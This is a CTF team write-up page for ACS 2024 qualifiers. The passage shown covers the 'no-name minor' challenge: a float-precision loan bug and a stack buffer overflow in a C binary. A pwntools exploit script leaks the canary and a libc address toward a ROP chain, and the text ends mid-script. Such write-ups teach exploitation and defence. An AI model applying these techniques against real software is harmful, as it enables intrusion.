<!DOCTYPE html>
<html lang="en" dir="auto">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="noindex, nofollow">
<title>ACS24 Vietnam Team Teh Tarik Cendol Writeup | Irfan Haziq&#39;s Site</title>
<meta name="keywords" content="ACS24, PWN, Rev, Misc, Web">
<meta name="description" content="ACS2024 Quals Writeup by Teh Tarik Cendol
Note: This is a team writeup and improved by Jeremy. Source : Jeremy&rsquo;s Github
Table of Contents

Audit/no-name minor
Rev/CS1338: Script Programming
Rev/Secure Chat
Web/Can You REDIRECT Me
Misc/Drone Hijacking
Misc/Lutella
Misc/Hi Alien
Crypto/Secret Encrypt

Audit/no-name minor
This was a challenge similar to the one I created for Battle of Hackers 2024 so we solved it relatively fast. The challenge provides us with a binary that presents a menu that allows the user to borrow a loan, repay the loan, mining for money, buy a name and change name.">
<meta name="author" content="Jeremy, Capang, Jia Qi, Aniq">
<link rel="canonical" href="http://localhost:1313/posts/acs24-team-writeup/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.45e028aa8ce0961349adf411b013ee39406be2c0bc80d4ea3fc04555f7f4611a.css" integrity="sha256-ReAoqozglhNJrfQRsBPuOUBr4sC8gNTqP8BFVff0YRo=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://localhost:1313/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/acs24-team-writeup/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://localhost:1313/" accesskey="h" title="Irfan Haziq&#39;s Site (Alt + H)">Irfan Haziq&#39;s Site</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://localhost:1313/search/" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/tags/" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/posts/">Posts</a></div>
    <h1 class="post-title entry-hint-parent">
      ACS24 Vietnam Team Teh Tarik Cendol Writeup
    </h1>
    <div class="post-meta"><span title='2025-01-24 04:04:31 +0800 +08'>January 24, 2025</span>&nbsp;·&nbsp;14 min&nbsp;·&nbsp;Jeremy, Capang, Jia Qi, Aniq

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#acs2024-quals-writeup-by-teh-tarik-cendol" aria-label="ACS2024 Quals Writeup by Teh Tarik Cendol">ACS2024 Quals Writeup by Teh Tarik Cendol</a><ul>
                        
                <li>
                    <a href="#table-of-contents" aria-label="Table of Contents">Table of Contents</a></li></ul>
                </li>
                <li>
                    <a href="#auditno-name-minor" aria-label="Audit/no-name minor">Audit/no-name minor</a><ul>
                        <ul>
                        
                <li>
                    <a href="#proof-of-concept" aria-label="Proof of Concept">Proof of Concept</a></li>
                <li>
                    <a href="#exploiting-the-program" aria-label="Exploiting the Program">Exploiting the Program</a></li>
                <li>
                    <a href="#buffer-overflow" aria-label="Buffer Overflow">Buffer Overflow</a></li></ul>
                    </ul>
                </li>
                <li>
                    <a href="#revcs1338-script-programming" aria-label="Rev/CS1338: Script Programming">Rev/CS1338: Script Programming</a></li>
                <li>
                    <a href="#revsecure-chat" aria-label="Rev/Secure Chat">Rev/Secure Chat</a><ul>
                        <ul>
                        
                <li>
                    <a href="#reversing-serverexe" aria-label="Reversing server.exe">Reversing server.exe</a></li>
                <li>
                    <a href="#reversing-clientexe" aria-label="Reversing client.exe">Reversing client.exe</a></li>
                <li>
                    <a href="#understanding-how-the-key-being-shared-on-network" aria-label="Understanding how the KEY being shared on network">Understanding how the KEY being shared on network</a></li></ul>
                    </ul>
                </li>
                <li>
                    <a href="#webcan-you-redirect-me" aria-label="Web/Can You REDIRECT Me">Web/Can You REDIRECT Me</a></li>
                <li>
                    <a href="#miscdrone-hijacking" aria-label="Misc/Drone Hijacking">Misc/Drone Hijacking</a></li>
                <li>
                    <a href="#misclutella" aria-label="Misc/Lutella">Misc/Lutella</a></li>
                <li>
                    <a href="#mischi-alien" aria-label="Misc/Hi Alien">Misc/Hi Alien</a><ul>
                        <ul>
                        
                <li>
                    <a href="#acssectionbin" aria-label="Acssection.bin">Acssection.bin</a></li></ul>
                    </ul>
                </li>
                <li>
                    <a href="#cryptosecret-encrypt" aria-label="Crypto/Secret Encrypt">Crypto/Secret Encrypt</a></li>
                <li>
                    <a href="#moments-" aria-label="Moments !!!">Moments !!!</a>
                </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h1 id="acs2024-quals-writeup-by-teh-tarik-cendol">ACS2024 Quals Writeup by Teh Tarik Cendol<a hidden class="anchor" aria-hidden="true" href="#acs2024-quals-writeup-by-teh-tarik-cendol">#</a></h1>
<p>Note: This is a team writeup and improved by <a href="https://www.linkedin.com/in/jeremy-phang-kah-chun/"><strong>Jeremy</strong></a>. Source : <a href="https://github.com/fyrepaw13/ctf_writeups/blob/main/ACS2024/README.md">Jeremy&rsquo;s Github</a></p>
<h2 id="table-of-contents">Table of Contents<a hidden class="anchor" aria-hidden="true" href="#table-of-contents">#</a></h2>
<ul>
<li><a href="#Auditno-name-minor">Audit/no-name minor</a></li>
<li><a href="#RevCS1338-Script-Programming">Rev/CS1338: Script Programming</a></li>
<li><a href="#RevSecure-Chat">Rev/Secure Chat</a></li>
<li><a href="#WebCan-You-REDIRECT-Me">Web/Can You REDIRECT Me</a></li>
<li><a href="#MiscDrone-Hijacking">Misc/Drone Hijacking</a></li>
<li><a href="#MiscLutella">Misc/Lutella</a></li>
<li><a href="#MiscHi-Alien">Misc/Hi Alien</a></li>
<li><a href="#CryptoSecret-Encrypt">Crypto/Secret Encrypt</a></li>
</ul>
<h1 id="auditno-name-minor">Audit/no-name minor<a hidden class="anchor" aria-hidden="true" href="#auditno-name-minor">#</a></h1>
<p>This was a challenge similar to the one I created for Battle of Hackers 2024 so we solved it relatively fast. The challenge provides us with a binary that presents a menu that allows the user to borrow a loan, repay the loan, mining for money, buy a name and change name.</p>
<p><img alt="image" loading="lazy" src="https://github.com/user-attachments/assets/90df0d94-6313-47c3-98f0-9376ca855de0"></p>
<p>The goal is to get a name. But</p>
<ul>
<li>To buy a name, you need to have money.</li>
<li>To have money you cannot simply mine, cause it will take a lot of time.</li>
<li>So you need to loan and then repay them.</li>
</ul>
<p>The vulnerability lies in the way the program keeps track of the user&rsquo;s loan.</p>
<!-- raw HTML omitted -->
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// Miner struct
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">struct</span> MinerAccount {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">float</span> cash;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">float</span> debt_balance;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> mining_attempts;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> name[<span style="color:#ae81ff">0x20</span>];
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Loan function
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">loan</span>(<span style="color:#66d9ef">struct</span> MinerAccount <span style="color:#f92672">*</span>account) {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">uint32_t</span> amount <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;How much loan would you like to request?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%d&#34;</span>, <span style="color:#f92672">&amp;</span>amount) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>    	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Invalid input</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    	<span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(account<span style="color:#f92672">-&gt;</span>debt_balance <span style="color:#f92672">+</span> amount <span style="color:#f92672">&gt;</span> MAX_LOAN) {
</span></span><span style="display:flex;"><span>    	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Loan limit exceeded</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    	<span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	account<span style="color:#f92672">-&gt;</span>cash <span style="color:#f92672">+=</span> amount;
</span></span><span style="display:flex;"><span>	account<span style="color:#f92672">-&gt;</span>debt_balance <span style="color:#f92672">+=</span> amount;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Current cash: $%.2f</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, account<span style="color:#f92672">-&gt;</span>cash);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Debt balance: $%.2f</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, account<span style="color:#f92672">-&gt;</span>debt_balance);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><!-- raw HTML omitted -->
<p>The user&rsquo;s loan is defined as a float, which can be subjected to <strong>floating point inaccuracy.</strong>  A float is 32 bit and it has 1 bit for sign, 23 bit for mantissa and 8 bit for exponent. For integers, the inaccuracy starts at 2^24 (16,777,216). In other words, all integers can be represented as floats up to 2^24 but not beyond that. Specifically, in the range of 2^24 to 2^25, float does not support odd numbers, only even numbers.</p>
<!-- raw HTML omitted -->
<h3 id="proof-of-concept">Proof of Concept<a hidden class="anchor" aria-hidden="true" href="#proof-of-concept">#</a></h3>
<p><img alt="image" loading="lazy" src="https://github.com/user-attachments/assets/e75708b0-e383-4faa-bb98-5bbff0919289"></p>
<p>Heres a simple C program that demonstrates this</p>
<p><img alt="image" loading="lazy" src="https://github.com/user-attachments/assets/592a968a-5ee3-4b0d-a6b0-281de6eae7fa"></p>
<p>This is the output</p>
<!-- raw HTML omitted -->
<h3 id="exploiting-the-program">Exploiting the Program<a hidden class="anchor" aria-hidden="true" href="#exploiting-the-program">#</a></h3>
<p>Now, we just need to borrow money until 16777216, buy the name, and borrow loan of size $1 until we eventually are able to repay our loan.</p>
<p><img alt="image" loading="lazy" src="https://github.com/user-attachments/assets/ad4d18bc-c5af-45d3-b630-8f4067bb0321"></p>
<p>Buying the name</p>
<p><img alt="image" loading="lazy" src="https://github.com/user-attachments/assets/318be9bc-d5d2-419d-a6cb-637534776cb4"></p>
<p>After borrowing $1</p>
<h3 id="buffer-overflow">Buffer Overflow<a hidden class="anchor" aria-hidden="true" href="#buffer-overflow">#</a></h3>
<!-- raw HTML omitted -->
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#define MAX_BUF 0x200
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">struct</span> MinerAccount {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">float</span> cash;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">float</span> debt_balance;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> mining_attempts;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> name[<span style="color:#ae81ff">0x20</span>];
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">change_name</span>(<span style="color:#66d9ef">struct</span> MinerAccount <span style="color:#f92672">*</span>account) {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (has_name_rights <span style="color:#f92672">!=</span> <span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>    	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;You do not have the right to change your name.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Please purchase a name to gain the rights to rename your no-name.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    	<span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(account<span style="color:#f92672">-&gt;</span>debt_balance <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;You still have debts to repay.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Pay off your debts to rename your no-name.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    	<span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Enter new name.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, account<span style="color:#f92672">-&gt;</span>name, MAX_BUF);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Name updated successfully.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">initialize</span>();
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">srand</span>(<span style="color:#a6e22e">time</span>(NULL));
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> MinerAccount account <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#e6db74">&#34;no-name&#34;</span>};
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">while</span>(<span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>    	<span style="color:#66d9ef">int</span> choice;
</span></span><span style="display:flex;"><span>    	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;===========================</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Welcome to %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, account.name);
</span></span><span style="display:flex;"><span>    	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Current cash: $%.2f</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, account.cash);
</span></span><span style="display:flex;"><span>    	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Debt balance: $%.2f</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, account.debt_balance);
</span></span><span style="display:flex;"><span>    	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;===========================</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;1. Loan</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">2. Repayment</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">3. Mining</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">4. Buy Name</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">5. Change Name</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">6. Exit</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Choose an action.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    	<span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%d&#34;</span>, <span style="color:#f92672">&amp;</span>choice);
</span></span><span style="display:flex;"><span>    	<span style="color:#66d9ef">switch</span>(choice) {
</span></span><span style="display:flex;"><span>        	<span style="color:#66d9ef">case</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            	<span style="color:#a6e22e">loan</span>(<span style="color:#f92672">&amp;</span>account);
</span></span><span style="display:flex;"><span>            	<span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        	<span style="color:#66d9ef">case</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            	<span style="color:#a6e22e">repayment</span>(<span style="color:#f92672">&amp;</span>account);
</span></span><span style="display:flex;"><span>            	<span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        	<span style="color:#66d9ef">case</span> <span style="color:#ae81ff">3</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            	<span style="color:#a6e22e">mining</span>(<span style="color:#f92672">&amp;</span>account);
</span></span><span style="display:flex;"><span>            	<span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        	<span style="color:#66d9ef">case</span> <span style="color:#ae81ff">4</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            	<span style="color:#a6e22e">buy_name</span>(<span style="color:#f92672">&amp;</span>account);
</span></span><span style="display:flex;"><span>            	<span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        	<span style="color:#66d9ef">case</span> <span style="color:#ae81ff">5</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            	<span style="color:#a6e22e">change_name</span>(<span style="color:#f92672">&amp;</span>account);
</span></span><span style="display:flex;"><span>            	<span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        	<span style="color:#66d9ef">case</span> <span style="color:#ae81ff">6</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        	<span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Invalid choice</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>            	<span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    	}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><!-- raw HTML omitted -->
<p>The name in MinerAccount object was assigned to only 0x20 size, but in change_name function we can change up until 0x200. With the help of the printf() in main, we are able to leak the stack canary and libc address after overwriting enough bytes using read(). Putting it all together, we get</p>
<ol>
<li>We loan 16777216 money</li>
<li>Then we buy name so our money no 16777216 - 1337</li>
<li>Then if we loan 1 dollar each time, our cash increase, but debt stays the same. So we loan 1 dollar for 1337 times</li>
<li>Then can repay all debt</li>
<li>Now start the leaking process through name</li>
<li>Leak canary</li>
<li>Leak libc_start_main address</li>
<li>Proceed will rop chain to system</li>
</ol>
<!-- raw HTML omitted -->
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./prob&#39;</span>
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(exe, checksec <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>process()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;info&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#---------------------------------------------------------------------</span>
</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e">#io.recvuntil(b&#39;Choose an action.\n&#39;)</span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e">#io.recvuntil(b&#39;How much loan would you like to request?\n&#39;)</span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;16777216&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#io.recvuntil(b&#39;Choose an action.\n&#39;)</span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;4&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1337</span>):
</span></span><span style="display:flex;"><span><span style="color:#75715e">#	io.recvuntil(b&#39;Choose an action.\n&#39;)</span>
</span></span><span style="display:flex;"><span>	io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e">#	io.recvuntil(b&#39;How much loan would you like to request?\n&#39;)</span>
</span></span><span style="display:flex;"><span>	io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Choose an action.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;How much would you like to repay?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;16777216&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Choose an action.&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;5&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Enter new name.&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">44</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>canary <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">7</span>)<span style="color:#f92672">.</span>strip()
</span></span><span style="display:flex;"><span>canary <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">+</span>canary
</span></span><span style="display:flex;"><span>canary <span style="color:#f92672">=</span> unpack(canary)
</span></span><span style="display:flex;"><span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Canary: </span><span style="color:#e6db74">{</span>hex(canary)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Choose an action.&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;5&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Enter new name.&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">59</span>)
